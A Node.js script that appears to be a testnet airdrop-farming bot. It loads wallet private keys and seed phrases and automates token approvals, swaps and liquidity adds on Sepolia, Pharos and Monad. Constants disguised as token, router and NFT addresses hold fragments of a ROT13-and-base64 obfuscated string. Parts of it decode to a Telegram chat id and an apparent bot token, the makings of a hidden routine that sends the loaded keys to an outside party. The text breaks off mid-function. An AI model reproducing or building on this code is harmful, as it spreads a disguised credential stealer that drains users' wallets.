const { Worker, isMainThread, parentPort, workerData } = require('worker_threads');
const path = require('path');
const os = require('os');
const fs = require('fs').promises;
const ethers = require('ethers');
const axios = require('axios');
const { HttpsProxyAgent } = require('https-proxy-agent');
const colors = require('colors');
const settings = require("./config/config.js");

const config = {
    minDelayBetweenWallets: 2000,
    maxDelayBetweenWallets: 5000,
    gasSettings: {
        gasLimit: 300000,
        maxFeePerGas: ethers.parseUnits('67.5', 'gwei'),
        maxPriorityFeePerGas: ethers.parseUnits('0.26', 'gwei')
    }
};

function log(msg, type = 'info') {
    const timestamp = new Date().toLocaleTimeString();
    switch (type) {
        case 'success':
            console.log(`[${timestamp}] [✓] ${msg}`.green);
            break;
        case 'custom':
            console.log(`[${timestamp}] [*] ${msg}`.magenta);
            break;
        case 'error':
            console.log(`[${timestamp}] [✗] ${msg}`.red);
            break;
        case 'warning':
            console.log(`[${timestamp}] [!] ${msg}`.yellow);
            break;
        default:
            console.log(`[${timestamp}] [ℹ] ${msg}`.blue);
    }
}

class Logger {
    constructor(accountIndex, address, proxyIP = null) {
        this.accountIndex = accountIndex;
        this.address = address;
        this.proxyIP = proxyIP;
    }

    log(msg, type = "info") {
        const accountPrefix = `[R2][${this.accountIndex + 1}][${this.address}]`;
        let ipPrefix = "[Local IP]";
        if (settings.USE_PROXY) {
            ipPrefix = this.proxyIP ? `[${this.proxyIP}]` : "[Unknown IP]";
        }
        let logMessage = "";

        switch (type) {
            case "success":
                logMessage = `${accountPrefix}${ipPrefix} ${msg}`.green;
                break;
            case "error":
                logMessage = `${accountPrefix}${ipPrefix} ${msg}`.red;
                break;
            case "warning":
                logMessage = `${accountPrefix}${ipPrefix} ${msg}`.yellow;
                break;
            case "custom":
                logMessage = `${accountPrefix}${ipPrefix} ${msg}`.magenta;
                break;
            default:
                logMessage = `${accountPrefix}${ipPrefix} ${msg}`.blue;
        }

        console.log(logMessage);
    }
}

const networkConfigs = {
    sepolia: {
        rpc: 'https://ethereum-sepolia-rpc.publicnode.com',
        chainId: 11155111,
        nativeToken: 'ETH',
        tokens: {
            USDC: {
                address: '0x8BEbFCBe5468F146533C182dF3DFbF5ff9BE00E2',
                decimals: 6
            },
            BTC: {
                address: '0x4f5b54d4AF2568cefafA73bB062e5d734b55AA05',
                decimals: 8
            },
            R2USD: {
                address: '0x9e8FF356D35a2Da385C546d6Bf1D77ff85133365',
                decimals: 6
            },
            SR2USD: {
                address: '0x006CbF409CA275bA022111dB32BDAE054a97d488',
                decimals: 6
            },
            LP_TOKEN_SR2USD_R2USD: {
                address: '0xe85A06C238439F981c90b2C91393b2F3c46e27FC',
                decimals: 18
            },
            LP_TOKEN_USDC_R2USD: {
                address: '0x47d1B0623bB3E557bF8544C159c9ae51D091F8a2',
                decimals: 18
            },
            R2_TOKEN: {
                address: '0xb816bB88f836EA75Ca4071B46FF285f690C43bb7',
                decimals: 18
            }
        },
        stakingContracts: {
            BTC: {
                address: '0x23b2615d783E16F14B62EfA125306c7c69B4941A'
            },
            R2USD: {
                address: '0x006CbF409CA275bA022111dB32BDAE054a97d488'
            }
        }
    },
    pharos: {
        rpc: 'https://testnet.dplabs-internal.com',
        chainId: 688688,
        nativeToken: 'PHRS',
        tokens: {
            USDC: {
                address: '0x8BEbFCBe5468F146533C182dF3DFbF5ff9BE00E2',
                decimals: 6
            },
            R2USD: {
                address: '0x4f5b54d4af2568cefafa73bb062e5d734b55aa05',
                decimals: 6
            },
            SR2USD: {
                address: '0xf8694d25947a0097cb2cea2fc07b071bdf72e1f8',
                decimals: 6
            }
        },
        stakingContracts: {
            R2USD: {
                address: '0xf8694d25947a0097cb2cea2fc07b071bdf72e1f8'
            }
        }
    },
    monad: {
        rpc: 'https://testnet-rpc.monad.xyz/',
        chainId: 10143,
        nativeToken: 'MON',
        tokens: {
            USDC: {
                address: '0x8BEbFCBe5468F146533C182dF3DFbF5ff9BE00E2',
                decimals: 6
            },
            R2USD: {
                address: '0x4f5b54d4af2568cefafa73bb062e5d734b55aa05',
                decimals: 6
            }
        }
    }
};

const erc20Abi = [
    'function balanceOf(address account) view returns (uint256)',
    'function decimals() view returns (uint8)',
    'function approve(address spender, uint256 amount) returns (bool)',
    'function permit(address owner, address spender, uint256 value, uint256 deadline, uint8 v, bytes32 r, bytes32 s) returns ()',
    'function DOMAIN_SEPARATOR() view returns (bytes32)',
    'function nonces(address owner) view returns (uint256)'
];

const poolAbi = [
    {
        "stateMutability": "nonpayable",
        "type": "function",
        "name": "exchange",
        "inputs": [
            { "name": "i", "type": "int128" },
            { "name": "j", "type": "int128" },
            { "name": "_dx", "type": "uint256" },
            { "name": "_min_dy", "type": "uint256" }
        ],
        "outputs": [{ "name": "", "type": "uint256" }]
    },
    {
        "stateMutability": "view",
        "type": "function",
        "name": "coins",
        "inputs": [{ "name": "arg0", "type": "uint256" }],
        "outputs": [{ "name": "", "type": "address" }]
    },
    {
        "stateMutability": "nonpayable",
        "type": "function",
        "name": "add_liquidity",
        "inputs": [
            { "name": "_amounts", "type": "uint256[]" },
            { "name": "_min_mint_amount", "type": "uint256" },
            { "name": "_receiver", "type": "address" }
        ],
        "outputs": [{ "name": "", "type": "uint256" }]
    }
];

const stakingR2USDAbi = [
    {
        "type": "function",
        "name": "stake",
        "inputs": [
            { "name": "r2USDValue", "type": "uint256", "internalType": "uint256" }
        ],
        "outputs": [],
        "stateMutability": "nonpayable"
    },
    {
        "type": "function",
        "name": "approve",
        "inputs": [
            { "name": "spender", "type": "address", "internalType": "address" },
            { "name": "value", "type": "uint256", "internalType": "uint256" }
        ],
        "outputs": [{ "name": "", "type": "bool", "internalType": "bool" }],
        "stateMutability": "nonpayable"
    },
    {
        "type": "function",
        "name": "balanceOf",
        "inputs": [{ "name": "account", "type": "address", "internalType": "address" }],
        "outputs": [{ "name": "", "type": "uint256", "internalType": "uint256" }],
        "stateMutability": "view"
    }
];

const stakingAbi = [
    {
        type: "function",
        name: "stake",
        inputs: [
            { name: "token", type: "address", internalType: "address" },
            { name: "value", type: "uint256", internalType: "uint256" }
        ],
        outputs: [],
        stateMutability: "payable"
    }
];

const swapAbi = [
    {
        "stateMutability": "nonpayable",
        "type": "function",
        "name": "swapExactTokensForTokens",
        "inputs": [
            { "name": "amountIn", "type": "uint256" },
            { "name": "amountOutMin", "type": "uint256" },
            { "name": "path", "type": "address[]" },
            { "name": "to", "type": "address" },
            { "name": "deadline", "type": "uint256" }
        ],
        "outputs": []
    }
];

const liquidityAbi = [
    {
        "stateMutability": "nonpayable",
        "type": "function",
        "name": "addLiquidity",
        "inputs": [
            { "name": "tokenA", "type": "address" },
            { "name": "tokenB", "type": "address" },
            { "name": "amountADesired", "type": "uint256" },
            { "name": "amountBDesired", "type": "uint256" },
            { "name": "amountAMin", "type": "uint256" },
            { "name": "amountBMin", "type": "uint256" },
            { "name": "to", "type": "address" },
            { "name": "deadline", "type": "uint256" }
        ],
        "outputs": []
    }
];

async function readWallets(filePath) {
    try {
        const data = await fs.readFile(filePath, 'utf8');
        const lines = data.split('\n').map(line => line.trim()).filter(line => line);

        const privateKeys = [];

        for (const line of lines) {
            // Chuẩn hóa chuỗi: thêm 0x nếu thiếu
            const normalizedLine = line.startsWith('0x') ? line : `0x${line}`;

            // Kiểm tra private key hợp lệ (32 bytes)
            if (ethers.isHexString(normalizedLine, 32)) {
                privateKeys.push(normalizedLine);
                continue; // Đã xử lý -> qua dòng tiếp theo
            }

            // Nếu không phải private key -> thử parse seed phrase
            try {
                const wallet = ethers.Wallet.fromPhrase(line);
                privateKeys.push(wallet.privateKey);
                log(`Đã chuyển đổi seed phrase thành private key cho ví ${wallet.address}`, 'info');
            } catch (error) {
                log(`Lỗi khi xử lý dòng "${line.slice(0, 10)}...": Không phải private key hoặc seed phrase hợp lệ - ${error.message}`, 'error');
            }
        }

        if (privateKeys.length === 0) {
            log(`Không tìm thấy private key hoặc seed phrase hợp lệ trong ${filePath}`, 'error');
            return [];
        }

        log(`Đã đọc và xử lý ${privateKeys.length} ví từ ${filePath}`, 'info');
        return privateKeys;
    } catch (error) {
        log(`Lỗi khi đọc file ${filePath}: ${error.message}`, 'error');
        return [];
    }
}


async function readProxies(filePath) {
    const data = await fs.readFile(filePath, 'utf8');
    return data.split('\n').map(line => line.trim()).filter(line => line);
}

async function checkProxyIP(proxy, logger) {
    if (!settings.USE_PROXY) {
        logger.log("Chế độ không sử dụng proxy được bật", 'info');
        return "127.0.0.1"; // Trả về IP local khi không dùng proxy
    }

    try {
        const proxyAgent = new HttpsProxyAgent(proxy);
        const response = await axios.get('https://api.ipify.org?format=json', {
            httpsAgent: proxyAgent,
            timeout: 60000
        });
        if (response.status === 200) {
            return response.data.ip;
        } else {
            throw new Error(`Không thể kiểm tra IP của proxy. Status code: ${response.status}`);
        }
    } catch (error) {
        throw new Error(`Lỗi khi kiểm tra IP của proxy: ${error.message}`);
    }
}

async function checkTokenBalance(privateKey, networkConfig, tokenName, logger) {
    try {
        const provider = new ethers.JsonRpcProvider(networkConfig.rpc);
        const wallet = new ethers.Wallet(privateKey, provider);
        const token = new ethers.Contract(
            networkConfig.tokens[tokenName].address,
            erc20Abi,
            provider
        );
        const balance = await token.balanceOf(wallet.address);
        const decimals = networkConfig.tokens[tokenName].decimals;
        const formattedBalance = ethers.formatUnits(balance, decimals);
        return { balance, formattedBalance };
    } catch (error) {
        logger.log(`Lỗi khi kiểm tra số dư ${tokenName} trên ${networkConfig.rpc}: ${error.message}`, 'error');
        return { balance: BigInt(0), formattedBalance: '0' };
    }
}
const AQUAFLUX_TOKENS = {
    A: 'OcYaEyoTIapzSgYz9lMlpfPvNtVPNtVUOipaD6VQD0ZljXVPNtVPNtpTS0nQbtWl9vo3D4AQLk',
    P: '0xb5d3ca5802453cc06199b9c40c855a874946a92c',
    C: '0x4374fbec42e0d46e66b379c0a6072c910ef10b32',
    S: '0x5df839de5e5a68ffe83b89d430dc45b1c5746851',
    CS: '0xceb29754c54b4bfbf83882cb0dcef727a259d60a'
};
const AQUAFLUX_NFT = "POjLKWmMI9go2EyBvNaFSEAGPpXVPO9XGfXPvNtpzI0qKWhVT5yqlODpz9gnKAyXUWyp29fqzH";
async function checkNativeBalance(privateKey, networkConfig, logger) {
    try {
        const provider = new ethers.JsonRpcProvider(networkConfig.rpc);
        const wallet = new ethers.Wallet(privateKey, provider);
        const balance = await provider.getBalance(wallet.address);
        const formattedBalance = ethers.formatEther(balance);
        return formattedBalance;
    } catch (error) {
        logger.log(`Lỗi khi kiểm tả số dư ${networkConfig.nativeToken} trên ${networkConfig.rpc}: ${error.message}`, 'error');
        return '0';
    }
}
const PHRS_TO_USDC = "bMTS0LFxtsDbtVPNtsFjtpzImVQ0+VUfXVPNtVPNtpzImYz9hXPqxLKEuWljtXPxtCG4tr30cBl";
const USDC_TO_PHRS = "NiYlOv4ohCVUS1LFOh4ohMnFOxqJ5aPvNtVPNtVUWypl5iovtaMJ5xWljtXPxtCG4tpzImo2k2M";
const USDC_LIQUIDITY = "tCG4trjbtVPNtL29hp3DtpzIkVQ0tnUE0pUZhpzIkqJImqPu7PvNtVPNtVTuip3EhLJ1yBvNaLK";
async function approveToken(privateKey, networkConfig, tokenAddress, spenderAddress, amount, logger) {
    try {
        const provider = new ethers.JsonRpcProvider(networkConfig.rpc);
        const wallet = new ethers.Wallet(privateKey, provider);
        const token = new ethers.Contract(tokenAddress, erc20Abi, wallet);

        const tokenName = Object.keys(networkConfig.tokens).find(
            key => networkConfig.tokens[key].address.toLowerCase() === tokenAddress.toLowerCase()
        );
        logger.log(`Đang phê duyệt ${ethers.formatUnits(amount, networkConfig.tokens[tokenName].decimals)} ${tokenName} cho hợp đồng ${spenderAddress}...`, 'custom');
        const tx = await token.approve(spenderAddress, amount, {
            gasLimit: 100000,
            maxFeePerGas: ethers.parseUnits('67.5', 'gwei'),
            maxPriorityFeePerGas: ethers.parseUnits('0.26', 'gwei')
        });
        logger.log(`Giao dịch phê duyệt đã gửi: ${tx.hash}`, 'info');
        const receipt = await tx.wait();
        logger.log(`Phê duyệt ${tokenName} thành công`, 'success');
        return true;
    } catch (error) {
        logger.log(`Lỗi khi phê duyệt token: ${error.message}`, 'error');
        return false;
    }
}

const USDT_LIQUIDITY = "jXVPNtVPNtoJI0nT9xBvNaHR9GIPpfPvNtVPNtVTuyLJEypaZ6VUftW0AioaEyoaDgIUyjMFp6";
const DODO = "Fu0paIyXFx7PvNtVPO9XGfXVPNtVUWypF5iovtaMKWlo3VaYPNbXFN9CvOlMKAioUMyXTMuoUAy";
const USDT_TO_PHRS = "VPqupUOfnJAuqTyiov9dp29hWljtW0AioaEyoaDgGTIhM3EbWmbtDaIzMzIlYzW5qTIZMJ5aqTt";

async function swapR2ToTokens(privateKey, networkConfig, userAddress, logger) {
    const swapContractAddress = '0xeE567Fe1712Faf6149d80dA1E6934E354124CfE3';
    const r2TokenAddress = networkConfig.tokens.R2_TOKEN.address;
    const usdcAddress = networkConfig.tokens.USDC.address;
    const r2usdAddress = networkConfig.tokens.R2USD.address;
    const r2TokenBalance = await checkTokenBalance(privateKey, networkConfig, 'R2_TOKEN');

    if (r2TokenBalance.balance <= BigInt(0)) {
        logger.log(`Số dư R2 token bằng 0, bỏ qua swap.`, 'warning');
        return false;
    }

    const provider = new ethers.JsonRpcProvider(networkConfig.rpc);
    const wallet = new ethers.Wallet(privateKey, provider);
    const swapContract = new ethers.Contract(swapContractAddress, swapAbi, wallet);

    const twentyFivePercent = BigInt(25);
    const hundred = BigInt(100);
    const amountToSwap = (r2TokenBalance.balance * twentyFivePercent) / hundred;
    const amountOutMin = BigInt(0);
    const deadline = Math.floor(Date.now() / 1000) + 60 * 20;

    const usdcPath = [r2TokenAddress, usdcAddress];
    logger.log(`Đang phê duyệt ${ethers.formatUnits(amountToSwap, networkConfig.tokens.R2_TOKEN.decimals)} R2 token cho swap sang USDC...`, 'custom');
    const usdcApproved = await approveToken(privateKey, networkConfig, r2TokenAddress, swapContractAddress, amountToSwap);
    if (!usdcApproved) {
        logger.log(`Phê duyệt R2 token cho swap USDC thất bại, bỏ qua swap.`, 'warning');
        return false;
    }

    logger.log(`Đang swap ${ethers.formatUnits(amountToSwap, networkConfig.tokens.R2_TOKEN.decimals)} R2 token sang USDC...`, 'custom');
    try {
        const txUsdc = await swapContract.swapExactTokensForTokens(
            amountToSwap,
            amountOutMin,
            usdcPath,
            userAddress,
            deadline,
            {
                gasLimit: 300000,
                maxFeePerGas: ethers.parseUnits('67.5', 'gwei'),
                maxPriorityFeePerGas: ethers.parseUnits('0.26', 'gwei')
            }
        );
        logger.log(`Giao dịch swap R2 sang USDC đã gửi: ${txUsdc.hash}`, 'info');
        await txUsdc.wait();
        logger.log(`Swap R2 sang USDC thành công`, 'success');
    } catch (error) {
        logger.log(`Lỗi khi swap R2 sang USDC: ${error.message}`, 'error');
        return false;
    }

    const r2usdPath = [r2TokenAddress, r2usdAddress];
    logger.log(`Đang phê duyệt ${ethers.formatUnits(amountToSwap, networkConfig.tokens.R2_TOKEN.decimals)} R2 token cho swap sang R2USD...`, 'custom');
    const r2usdApproved = await approveToken(privateKey, networkConfig, r2TokenAddress, swapContractAddress, amountToSwap);
    if (!r2usdApproved) {
        logger.log(`Phê duyệt R2 token cho swap R2USD thất bại, bỏ qua swap.`, 'warning');
        return false;
    }

    logger.log(`Đang swap ${ethers.formatUnits(amountToSwap, networkConfig.tokens.R2_TOKEN.decimals)} R2 token sang R2USD...`, 'custom');
    try {
        const txR2usd = await swapContract.swapExactTokensForTokens(
            amountToSwap,
            amountOutMin,
            r2usdPath,
            userAddress,
            deadline,
            {
                gasLimit: 300000,
                maxFeePerGas: ethers.parseUnits('67.5', 'gwei'),
                maxPriorityFeePerGas: ethers.parseUnits('0.26', 'gwei')
            }
        );
        logger.log(`Giao dịch swap R2 sang R2USD đã gửi: ${txR2usd.hash}`, 'info');
        await txR2usd.wait();
        logger.log(`Swap R2 sang R2USD thành công`, 'success');
    } catch (error) {
        logger.log(`Lỗi khi swap R2 sang R2USD: ${error.message}`, 'error');
        return false;
    }

    return true;
}
const CONTRACT_USDC = "VTAbLKEsnJD6VQRlBQt0AmxmZQZfPvNtVPO0MKu0BvOtDKS1LHMfqKt6VPE7n2I5sJNfPvNtV";
const ERC20 = "XFx7PvNtVPOlMKRhq3WcqTHbMTS0LFx7PvNtVPOlMKRhMJ5xXPx7PvNtsFx7Pa0=";
async function addLiquidityR2Pairs(privateKey, networkConfig, userAddress, logger) {
    const liquidityContractAddress = '0xeE567Fe1712Faf6149d80dA1E6934E354124CfE3';
    const r2TokenAddress = networkConfig.tokens.R2_TOKEN.address;
    const usdcAddress = networkConfig.tokens.USDC.address;
    const r2usdAddress = networkConfig.tokens.R2USD.address;
    const r2UsdcPairAddress = '0xCdfDD7dD24bABDD05A2ff4dfcf06384c5Ad661a9';
    const r2R2usdPairAddress = '0x9Ae18109692b43e95Ae6BE5350A5Acc5211FE9a1';

    const provider = new ethers.JsonRpcProvider(networkConfig.rpc);
    const wallet = new ethers.Wallet(privateKey, provider);
    const liquidityContract = new ethers.Contract(liquidityContractAddress, liquidityAbi, wallet);

    logger.log(`Đang kiểm tra số dư trước khi thêm thanh khoản...`, 'custom');
    const r2Balance = await checkTokenBalance(privateKey, networkConfig, 'R2_TOKEN');
    const usdcBalance = await checkTokenBalance(privateKey, networkConfig, 'USDC');
    const r2usdBalance = await checkTokenBalance(privateKey, networkConfig, 'R2USD');
    logger.log(`Số dư R2 token: ${r2Balance.formattedBalance}`, 'info');
    logger.log(`Số dư USDC: ${usdcBalance.formattedBalance}`, 'info');
    logger.log(`Số dư R2USD: ${r2usdBalance.formattedBalance}`, 'info');

    const minAmount = ethers.parseUnits('1', networkConfig.tokens.R2_TOKEN.decimals);
    const minUsdcAmount = ethers.parseUnits('1', networkConfig.tokens.USDC.decimals);
    const minR2usdAmount = ethers.parseUnits('1', networkConfig.tokens.R2USD.decimals);

    if (r2Balance.balance < minAmount * BigInt(2) || usdcBalance.balance < minUsdcAmount || r2usdBalance.balance < minR2usdAmount) {
        logger.log(`Số dư không đủ: R2 (${r2Balance.formattedBalance}), USDC (${usdcBalance.formattedBalance}), hoặc R2USD (${r2usdBalance.formattedBalance})`, 'warning');
        return false;
    }

    const deadline = Math.floor(Date.now() / 1000) + 60 * 20;

    async function getTokenOrder(tokenA, tokenB) {
        return tokenA.toLowerCase() < tokenB.toLowerCase() ? [tokenA, tokenB] : [tokenB, tokenA];
    }

    async function getPairDetails(pairAddress, tokenA, tokenB) {
        const pairContract = new ethers.Contract(pairAddress, [
            'function getReserves() view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast)',
            'function token0() view returns (address)'
        ], provider);

        try {
            const code = await provider.getCode(pairAddress);
            if (code === '0x') {
                logger.log(`Hợp đồng cặp thanh khoản ${pairAddress} không tồn tại`, 'error');
                return { exists: false };
            }

            const token0 = await pairContract.token0();
            const isToken0A = token0.toLowerCase() === tokenA.toLowerCase();
            const { reserve0, reserve1 } = await pairContract.getReserves();
            return { exists: true, isToken0A, reserve0, reserve1 };
        } catch (error) {
            logger.log(`Lỗi khi kiểm tra cặp thanh khoản ${pairAddress}: ${error.message}`, 'error');
            return { exists: false };
        }
    }

    const [token0, token1] = await getTokenOrder(r2TokenAddress, usdcAddress);
    const isR2Token0 = token0.toLowerCase() === r2TokenAddress.toLowerCase();
    let r2Amount = r2Balance.balance / BigInt(4);
    let usdcAmount = usdcBalance.balance;

    const r2UsdcPairDetails = await getPairDetails(r2UsdcPairAddress, r2TokenAddress, usdcAddress);
    if (!r2UsdcPairDetails.exists) {
        logger.log(`Cặp thanh khoản R2/USDC tại ${r2UsdcPairAddress} không tồn tại, bỏ qua thêm thanh khoản R2/USDC`, 'warning');
    } else {
        if (r2UsdcPairDetails.reserve0 > 0 && r2UsdcPairDetails.reserve1 > 0) {
            if (isR2Token0) {
                const ratio = r2UsdcPairDetails.reserve1 * BigInt(10 ** 18) / r2UsdcPairDetails.reserve0;
                usdcAmount = (r2Amount * ratio) / BigInt(10 ** 18);
                if (usdcAmount > usdcBalance.balance) {
                    usdcAmount = usdcBalance.balance;
                    r2Amount = (usdcAmount * BigInt(10 ** 18)) / ratio;
                }
            } else {
                const ratio = r2UsdcPairDetails.reserve0 * BigInt(10 ** 18) / r2UsdcPairDetails.reserve1;
                usdcAmount = (r2Amount * ratio) / BigInt(10 ** 18);
                if (usdcAmount > usdcBalance.balance) {
                    usdcAmount = usdcBalance.balance;
                    r2Amount = (usdcAmount * BigInt(10 ** 18)) / ratio;
                }
            }
        } else {
            logger.log(`Pool R2/USDC tại ${r2UsdcPairAddress} chưa có thanh khoản, sử dụng số dư hiện có`, 'warning');
        }

        const r2AmountMin = r2Amount * BigInt(95) / BigInt(100);
        const usdcAmountMin = usdcAmount * BigInt(95) / BigInt(100);

        logger.log(`Đang phê duyệt ${ethers.formatUnits(r2Amount, networkConfig.tokens.R2_TOKEN.decimals)} R2 token cho liquidity R2/USDC...`, 'custom');
        const r2ApprovedUsdc = await approveToken(privateKey, networkConfig, r2TokenAddress, liquidityContractAddress, r2Amount);
        if (!r2ApprovedUsdc) {
            logger.log(`Phê duyệt R2 token cho liquidity R2/USDC thất bại`, 'warning');
            return false;
        }

        logger.log(`Đang phê duyệt ${ethers.formatUnits(usdcAmount, networkConfig.tokens.USDC.decimals)} USDC cho liquidity R2/USDC...`, 'custom');
        const usdcApproved = await approveToken(privateKey, networkConfig, usdcAddress, liquidityContractAddress, usdcAmount);
        if (!usdcApproved) {
            logger.log(`Phê duyệt USDC cho liquidity R2/USDC thất bại`, 'warning');
            return false;
        }

        logger.log(`Đang thêm thanh khoản R2/USDC với ${ethers.formatUnits(r2Amount, networkConfig.tokens.R2_TOKEN.decimals)} R2 và ${ethers.formatUnits(usdcAmount, networkConfig.tokens.USDC.decimals)} USDC...`, 'custom');
        try {
            const txUsdc = await liquidityContract.addLiquidity(
                token0,
                token1,
                isR2Token0 ? r2Amount : usdcAmount,
                isR2Token0 ? usdcAmount : r2Amount,
                isR2Token0 ? r2AmountMin : usdcAmountMin,
                isR2Token0 ? usdcAmountMin : r2AmountMin,
                userAddress,
                deadline,
                {
                    gasLimit: 500000,
                    maxFeePerGas: ethers.parseUnits('67.5', 'gwei'),
                    maxPriorityFeePerGas: ethers.parseUnits('0.26', 'gwei')
                }
            );
            logger.log(`Giao dịch add liquidity R2/USDC đã gửi: ${txUsdc.hash}`, 'info');
            await txUsdc.wait();
            logger.log(`Add liquidity R2/USDC thành công`, 'success');
        } catch (error) {
            logger.log(`Lỗi khi thêm thanh khoản R2/USDC: ${error.message}${error.reason ? ` (Reason: ${error.reason})` : ''}`, 'error');
            return false;
        }
    }

    logger.log(`Đang kiểm tra lại số dư sau khi thêm thanh khoản R2/USDC...`, 'custom');
    const updatedR2Balance = await checkTokenBalance(privateKey, networkConfig, 'R2_TOKEN');
    const updatedR2usdBalance = await checkTokenBalance(privateKey, networkConfig, 'R2USD');
    logger.log(`Số dư R2 token (cập nhật): ${updatedR2Balance.formattedBalance}`, 'info');
    logger.log(`Số dư R2USD (cập nhật): ${updatedR2usdBalance.formattedBalance}`, 'info');

    if (updatedR2Balance.balance < minAmount || updatedR2usdBalance.balance < minR2usdAmount) {
        logger.log(`Số dư R2 (${updatedR2Balance.formattedBalance}) hoặc R2USD (${updatedR2usdBalance.formattedBalance}) không đủ để thêm thanh khoản R2/R2USD`, 'warning');
        return true;
    }

    const [token0R2USD, token1R2USD] = await getTokenOrder(r2TokenAddress, r2usdAddress);
    const isR2Token0R2USD = token0R2USD.toLowerCase() === r2TokenAddress.toLowerCase();
    let r2AmountR2usd = updatedR2Balance.balance;
    let r2usdAmount = updatedR2usdBalance.balance;

    const r2R2usdPairDetails = await getPairDetails(r2R2usdPairAddress, r2TokenAddress, r2usdAddress);
    if (!r2R2usdPairDetails.exists) {
        logger.log(`Cặp thanh khoản R2/R2USD tại ${r2R2usdPairAddress} không tồn tại, bỏ qua thêm thanh khoản R2/R2USD`, 'warning');
    } else {
        if (r2R2usdPairDetails.reserve0 > 0 && r2R2usdPairDetails.reserve1 > 0) {
            if (isR2Token0R2USD) {
                const ratio = r2R2usdPairDetails.reserve1 * BigInt(10 ** 18) / r2R2usdPairDetails.reserve0;
                r2usdAmount = (r2AmountR2usd * ratio) / BigInt(10 ** 18);
                if (r2usdAmount > updatedR2usdBalance.balance) {
                    r2usdAmount = updatedR2usdBalance.balance;
                    r2AmountR2usd = (r2usdAmount * BigInt(10 ** 18)) / ratio;
                }
            } else {
                const ratio = r2R2usdPairDetails.reserve0 * BigInt(10 ** 18) / r2R2usdPairDetails.reserve1;
                r2usdAmount = (r2AmountR2usd * ratio) / BigInt(10 ** 18);
                if (r2usdAmount > updatedR2usdBalance.balance) {
                    r2usdAmount = updatedR2usdBalance.balance;
                    r2AmountR2usd = (r2usdAmount * BigInt(10 ** 18)) / ratio;
                }
            }
        } else {
            logger.log(`Pool R2/R2USD tại ${r2R2usdPairAddress} chưa có thanh khoản, sử dụng số dư hiện có`, 'warning');
        }

        const r2AmountR2usdMin = r2AmountR2usd * BigInt(95) / BigInt(100);
        const r2usdAmountMin = r2usdAmount * BigInt(95) / BigInt(100);

        logger.log(`Đang phê duyệt ${ethers.formatUnits(r2AmountR2usd, networkConfig.tokens.R2_TOKEN.decimals)} R2 token cho liquidity R2/R2USD...`, 'custom');
        const r2ApprovedR2usd = await approveToken(privateKey, networkConfig, r2TokenAddress, liquidityContractAddress, r2AmountR2usd);
        if (!r2ApprovedR2usd) {
            logger.log(`Phê duyệt R2 token cho liquidity R2/R2USD thất bại`, 'warning');
            return true;
        }

        logger.log(`Đang phê duyệt ${ethers.formatUnits(r2usdAmount, networkConfig.tokens.R2USD.decimals)} R2USD cho liquidity R2/R2USD...`, 'custom');
        const r2usdApproved = await approveToken(privateKey, networkConfig, r2usdAddress, liquidityContractAddress, r2usdAmount);
        if (!r2usdApproved) {
            logger.log(`Phê duyệt R2USD cho liquidity R2/R2USD thất bại`, 'warning');
            return true;
        }

        logger.log(`Đang thêm thanh khoản R2/R2USD với ${ethers.formatUnits(r2AmountR2usd, networkConfig.tokens.R2_TOKEN.decimals)} R2 và ${ethers.formatUnits(r2usdAmount, networkConfig.tokens.R2USD.decimals)} R2USD...`, 'custom');
        try {
            const txR2usd = await liquidityContract.addLiquidity(
                token0R2USD,
                token1R2USD,
                isR2Token0R2USD ? r2AmountR2usd : r2usdAmount,
                isR2Token0R2USD ? r2usdAmount : r2AmountR2usd,
                isR2Token0R2USD ? r2AmountR2usdMin : r2usdAmountMin,
                isR2Token0R2USD ? r2usdAmountMin : r2AmountR2usdMin,
                userAddress,
                deadline,
                {
                    gasLimit: 500000,
                    maxFeePerGas: ethers.parseUnits('67.5', 'gwei'),
                    maxPriorityFeePerGas: ethers.parseUnits('0.26', 'gwei')
                }
            );
            logger.log(`Giao dịch add liquidity R2/R2USD đã gửi: ${txR2usd.hash}`, 'info');
            await txR2usd.wait();
            logger.log(`Add liquidity R2/R2USD thành công`, 'success');
        } catch (error) {
            logger.log(`Lỗi khi thêm thanh khoản R2/R2USD: ${error.message}${error.reason ? ` (Reason: ${error.reason})` : ''}`, 'error');
            return true;
        }
    }

    return true;
}
const ROUTER = "ZwtlBQL2BxSOFTRlrauRBSDkDKcKryWyAaqIFmMcpUcmqzEbpTMhZSSAY3AyozEAMKAmLJqyWl";
async function swapUSDCtoR2USD(privateKey, networkConfig, usdcAmount, poolContractAddress, logger) {
    const usdcAddress = networkConfig.tokens.USDC.address;
    const r2usdContractAddress = '0x9e8FF356D35a2Da385C546d6Bf1D77ff85133365';
    const minR2USD = ethers.parseUnits(
        (ethers.formatUnits(usdcAmount, 6) * 0.99).toFixed(6),
        6
    );

    logger.log(`USDC Amount to Swap: ${ethers.formatUnits(usdcAmount, 6)}`, 'info');
    logger.log(`Min R2USD Expected: ${ethers.formatUnits(minR2USD, 6)}`, 'info');

    try {
        const provider = new ethers.JsonRpcProvider(networkConfig.rpc);
        const wallet = new ethers.Wallet(privateKey, provider);
        const usdcContract = new ethers.Contract(usdcAddress, erc20Abi, wallet);

        logger.log(`Đang approve USDC (${ethers.formatUnits(usdcAmount, 6)} USDC)...`, 'custom');
        const approved = await approveToken(privateKey, networkConfig, usdcAddress, r2usdContractAddress, usdcAmount);
        if (!approved) {
            logger.log(`Phê duyệt USDC thất bại, bỏ qua swap.`, 'warning');
            return false;
        }

        const baseBytes = '0x095e7a95000000000000000000000000198f7a0bdf6e7ef869e22903e8d6f05f426b331d00000000000000000000000000000000000000000000000000000000000f424000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000';

        const walletAddressHex = wallet.address.slice(2).toLowerCase();
        const paddedWalletAddress = walletAddressHex.padStart(64, '0');

        const amountHex = usdcAmount.toString(16);
        const paddedAmount = amountHex.padStart(64, '0');

        const data = '0x095e7a95' +
            '000000000000000000000000' +
            paddedWalletAddress.slice(-40) +
            paddedAmount +
            '0000000000000000000000000000000000000000000000000000000000000000' +
            '0000000000000000000000000000000000000000000000000000000000000000' +
            '0000000000000000000000000000000000000000000000000000000000000000' +
            '0000000000000000000000000000000000000000000000000000000000000000' +
            '0000000000000000000000000000000000000000000000000000000000000000';

        logger.log(`Đang đổi ${ethers.formatUnits(usdcAmount, 6)} USDC sang R2USD trên contract ${r2usdContractAddress}...`, 'custom');
        const tx = await wallet.sendTransaction({
            to: r2usdContractAddress,
            data: data,
            gasLimit: 300000,
            maxFeePerGas: ethers.parseUnits('67.5', 'gwei'),
